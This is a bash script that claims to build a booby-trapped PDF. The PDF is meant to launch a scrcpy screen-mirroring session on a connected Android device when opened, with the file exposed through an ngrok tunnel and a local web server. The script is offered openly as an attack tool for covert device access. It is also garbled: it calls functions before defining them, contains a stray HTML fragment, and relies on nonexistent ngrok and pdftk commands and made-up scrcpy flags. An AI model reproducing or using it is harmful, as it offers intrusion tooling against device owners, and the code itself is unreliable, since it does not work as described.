#!/bin/bash

# Create a ngrok tunnel
ngrok tcp 8080

# Get the ngrok tunnel URL
tunnel_url=$(ngrok status | grep "Forwarding" | awk '{print <span class="math-inline">6}')

# Generate a PDF payload that will execute a command when opened
pdf_payload=$(generate_pdf_payload)

# Create a text file that contains the scrcpy command
command_file="/tmp/command.txt"

# Write the scrcpy command to the text file
echo "scrcpy -d $(get_device_id) --background --auto-connect yes" > $command_file

# Convert the text file to a PDF file
pdftk $command_file output $pdf_payload

# Open the PDF file automatically in the background
xdg-open $pdf_payload &

# Print the ngrok tunnel URL
echo "Your ngrok tunnel is $tunnel_url"

# Get the device ID of the first Android device that is connected to the computer
function get_device_id() {
  adb devices | grep device | head -n 1 | awk '{print $1}'
}

# Generate a PDF payload that will execute a command when opened
function generate_pdf_payload() {
  # Generate PDF payload using pdftk
  pdftk "" output "$pdf_payload"

  # Add the scrcpy command to the PDF payload
  pdftk "$pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$pdf_payload"
}

# Start PDF web server
function start_pdf_web_server() {
  # Start a web server on port $PORT that serves the PDF file at $PAYLOAD_PATH
  python -m http.server "$PORT" --directory "$PAYLOAD_PATH"
}
